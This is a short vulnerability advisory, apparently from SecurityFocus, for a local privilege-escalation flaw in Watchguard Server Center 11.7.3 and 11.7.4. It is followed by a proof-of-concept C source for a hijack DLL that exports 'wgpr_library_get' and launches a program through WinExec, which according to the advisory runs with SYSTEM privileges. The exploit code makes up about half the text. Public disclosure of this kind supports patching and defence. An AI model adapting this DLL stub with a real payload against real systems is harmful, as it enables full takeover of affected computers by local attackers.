source: http://www.securityfocus.com/bid/62261/info

Watchguard Server Center is prone to a local privilege-escalation vulnerability.

Local attackers can exploit this issue to gain SYSTEM privileges. Successful exploits will result in the complete compromise of affected computers.

Watchguard Server Center 11.7.4 and 11.7.3 are vulnerable; other versions may also be affected. 

#include <windows.h>

#define DLL_EXPORT __declspec(dllexport)

#ifdef __cplusplus
extern "C"
{
#endif

void DLL_EXPORT wgpr_library_get()
{
    WinExec("calc",0);
}

#ifdef __cplusplus
}
#endif

